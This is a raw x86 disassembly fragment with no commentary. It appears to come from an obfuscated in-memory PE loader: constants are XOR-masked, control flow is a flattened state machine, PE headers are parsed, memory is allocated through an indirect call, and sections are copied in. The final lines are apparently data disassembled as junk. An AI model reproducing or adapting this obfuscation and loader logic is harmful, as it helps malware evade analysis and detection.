  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0x55562587
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [ebx+eax*1+0x5f320000],ch
  419e8b:	test   al,0xec
  419e8d:	cld    
  419e8e:	xor    edi,0xa014f8db
  419e94:	das    
  419e95:	in     al,0xf8
  419e97:	lock push ss
  419e99:	inc    eax
  419e9a:	inc    edi
